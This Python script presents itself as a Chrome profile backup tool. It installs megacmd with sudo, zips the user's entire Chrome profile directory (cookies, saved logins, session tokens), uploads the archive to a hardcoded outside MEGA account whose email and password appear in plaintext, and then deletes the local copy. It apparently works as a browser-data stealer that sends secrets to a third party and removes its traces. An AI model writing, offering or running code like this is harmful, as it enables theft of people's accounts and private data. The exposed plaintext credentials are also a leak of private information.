import os
import zipfile
import subprocess
import uuid
import shutil

def install_megacmd():
    """Installs megacmd package."""
    try:
        print("Installing wget...")
        subprocess.run(['sudo', 'apt', 'install', '-y', 'wget'], check=True, capture_output=True, text=True)
        
        print("Downloading megacmd package...")
        subprocess.run([
            'wget', 
            'https://mega.nz/linux/repo/xUbuntu_20.04/amd64/megacmd-xUbuntu_20.04_amd64.deb'
        ], check=True, capture_output=True, text=True)
        
        print("Installing megacmd...")
        subprocess.run(['sudo', 'apt', 'install', '-y', './megacmd-xUbuntu_20.04_amd64.deb'], check=True, capture_output=True, text=True)
        
        print("Removing megacmd deb file...")
        subprocess.run(['rm', 'megacmd-xUbuntu_20.04_amd64.deb'], check=True, capture_output=True, text=True)
        print("megacmd installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error installing megacmd: {e.stderr}")
        exit(1)
    except Exception as e:
        print(f"Unexpected error during megacmd installation: {e}")
        exit(1)

def get_chrome_profile_path():
    """Finds the Chrome profile folder."""
    profiles_dir = os.path.expanduser('~/.config/google-chrome')
    if os.path.exists(profiles_dir):
        return profiles_dir
    else:
        print("Chrome profile directory not found.")
        return None

def zip_folder(folder_path, zip_name):
    """Zips the folder, skipping problematic files and symbolic links."""
    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                # Skip problematic files like SingletonSocket
                files_to_zip = [f for f in files if f != 'SingletonSocket']
                for file in files_to_zip:
                    file_path = os.path.join(root, file)
                    if not os.path.islink(file_path):
                        try:
                            arcname = os.path.relpath(file_path, folder_path)
                            zipf.write(file_path, arcname)
                        except Exception as e:
                            print(f"Skipping file {file_path} due to error: {e}")
                    else:
                        print(f"Symbolic link skipped: {file_path}")
        print(f"Chrome profile zipped successfully as {zip_name}")
    except Exception as e:
        print(f"Error zipping folder: {e}")
        exit(1)

def test_mega_login(email, password):
    """Tests MEGA login credentials."""
    try:
        print("Testing MEGA login credentials...")
        result = subprocess.run([
            'mega-login', 
            email, 
            password
        ], capture_output=True, text=True)
        if result.returncode == 0:
            print("MEGA login test successful.")
            # Log out after testing to avoid session conflicts
            subprocess.run(['mega-logout'], capture_output=True, text=True)
            return True
        else:
            print(f"MEGA login test failed: {result.stderr}")
            return False
    except subprocess.CalledProcessError as e:
        if "Already logged in" in e.stderr:
            print("Existing MEGA session detected. Attempting to log out...")
            subprocess.run(['mega-logout'], capture_output=True, text=True)
            # Retry login
            try:
                result = subprocess.run([
                    'mega-login', 
                    email, 
                    password
                ], check=True, capture_output=True, text=True)
                print("MEGA login retry successful.")
                subprocess.run(['mega-logout'], capture_output=True, text=True)
                return True
            except subprocess.CalledProcessError as retry_e:
                print(f"MEGA login retry failed: {retry_e.stderr}")
                return False
        else:
            print(f"MEGA login test failed: {e.stderr}")
            return False
    except Exception as e:
        print(f"Unexpected error during MEGA login test: {e}")
        return False

def upload_to_mega(zip_name):
    """Uploads the zip file to MEGA's /chrome-profile folder."""
    email = "volcnao62@gmail.com"
    password = "21504174lL@"
    
    # Force logout to clear any existing sessions
    print("Clearing any existing MEGA sessions...")
    subprocess.run(['mega-logout'], capture_output=True, text=True)
    
    # Test login credentials
    if not test_mega_login(email, password):
        print("Error: MEGA login failed. Please verify the email and password.")
        print("Try logging in manually to confirm credentials:")
        print(f"mega-login {email} '{password}'")
        exit(1)
    
    try:
        # Log in to MEGA account
        print("Logging in to MEGA...")
        subprocess.run([
            'mega-login', 
            email, 
            password
        ], check=True, capture_output=True, text=True)
        
        # Create /chrome-profile folder if it doesn't exist
        print("Creating /chrome-profile folder on MEGA...")
        subprocess.run(['mega-mkdir', '/chrome-profile'], capture_output=True, text=True)
        
        # Upload the zip file to /chrome-profile
        print(f"Uploading {zip_name} to MEGA /chrome-profile...")
        subprocess.run(['mega-put', zip_name, '/chrome-profile'], check=True, capture_output=True, text=True)
        print(f"File {zip_name} uploaded successfully to MEGA /chrome-profile")
    except subprocess.CalledProcessError as e:
        print(f"Error during MEGA operation: {e.stderr}")
        exit(1)
    except Exception as e:
        print(f"Unexpected error during upload: {e}")
        exit(1)
    finally:
        # Ensure logout after operations
        print("Logging out from MEGA...")
        subprocess.run(['mega-logout'], capture_output=True, text=True)

def delete_file(file_path):
    """Deletes the specified file."""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"File '{file_path}' deleted successfully.")
        else:
            print(f"File '{file_path}' does not exist.")
    except Exception as e:
        print(f"Error deleting file '{file_path}': {e}")

if __name__ == '__main__':
    # Install megacmd
    install_megacmd()
    
    # Get Chrome profile path
    chrome_profile_path = get_chrome_profile_path()
    
    if chrome_profile_path:
        # Generate a unique zip file name
        zip_name = f'chrome_profile_backup_{uuid.uuid4().hex[:8]}.zip'
        
        # Zip the Chrome profile folder
        zip_folder(chrome_profile_path, zip_name)
        
        # Upload the zip file to MEGA's /chrome-profile folder
        upload_to_mega(zip_name)
        
        # Remove the zip file after uploading
        delete_file(zip_name)
    else:
        print("Failed to locate Chrome profile. Exiting.")
        exit(1)
